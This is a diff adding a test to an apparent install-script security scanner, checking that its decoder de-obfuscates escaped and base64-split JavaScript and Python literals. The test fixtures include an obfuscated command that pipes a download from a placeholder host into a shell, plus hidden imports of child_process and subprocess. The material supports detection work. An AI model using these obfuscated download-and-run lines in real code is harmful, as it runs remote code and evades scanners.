@@ -39,6 +39,19 @@ test("names hidden from the install-script test", () => {
     ["sends environment variables over the network (the whole environment)" + NOTE]);
 });
 
+test("phase 2: literals read as the runtime reads them, in JavaScript and Python", () => {
+  const partly = "require('child_pro\\x63ess').execSync('cu\\x72l https://x.invalid/i.sh | sh');\n";
+  assert.equal(decodedView(partly, "js"), "require('child_process').execSync('curl https://x.invalid/i.sh | sh');\n");
+  assert.equal(decodedView(partly), partly);            // a text of no known language: wholly escaped literals only
+  assert.deepEqual(installScriptRisk(partly, true, false, "js"), ["pipes a download into a shell" + NOTE]);
+  const b64 = Buffer.from("child_process").toString("base64");
+  const joined = `const cp = require(atob('${b64.slice(0, 8)}' +\n  /* part */ "${b64.slice(8)}"));\nmodule.exports = cp;\n`;
+  assert.equal(decodedView(joined, "js"), "const cp = require('child_process');\n\nmodule.exports = cp;\n");
+  const py = Buffer.from("subprocess").toString("base64");
+  const adjacent = `import base64\nm = __import__(base64.b64decode('${py.slice(0, 6)}'\n    '${py.slice(6)}').decode())\n`;
+  assert.equal(decodedView(adjacent, "py"), "import base64\nm = __import__('subprocess')\n\n");
+});
+
 test("SC-EVAL-DECODER: eval of a decoder over a blob of character codes", () => {
   const rule = packValues("RULES")[0].find((r) => r.id === "SC-EVAL-DECODER").re;   // core's pattern, from the engine's pack
   const rx = pyRe(rule.re, rule.flags);
